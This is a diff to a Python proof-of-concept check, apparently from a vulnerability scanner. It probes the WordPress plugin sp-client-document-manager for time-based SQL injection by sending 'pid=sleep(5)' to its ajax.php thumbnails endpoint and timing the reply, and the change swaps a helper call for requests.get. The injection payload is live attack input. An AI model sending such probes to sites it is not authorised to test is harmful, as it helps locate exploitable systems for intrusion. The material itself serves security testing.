@@ -35,14 +35,16 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             ture_url='/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=1'
             start_time1=time.time()
-            code1, head1, res1, errcode1, _ = hh.http(ture_url)
+            req1 = requests.get(self.target + ture_url)
+            # code1, head1, res1, errcode1, _ = hh.http(ture_url)
             true_time=time.time()-start_time1
-                       
+
             flase_url='/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=sleep(5)'
             start_time2=time.time()
-            code2, head2, res2, errcode2, _ = hh.http(flase_url)
+            req2 = requests.get(self.target + flase_url)
+            # code2, head2, res2, errcode2, _ = hh.http(flase_url)
             flase_time=time.time()-start_time2
-            if code1==200 and code2==200 and flase_time>true_time and flase_time>5:
+            if req1.status_code==200 and req2.status_code==200 and flase_time>true_time and flase_time>5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
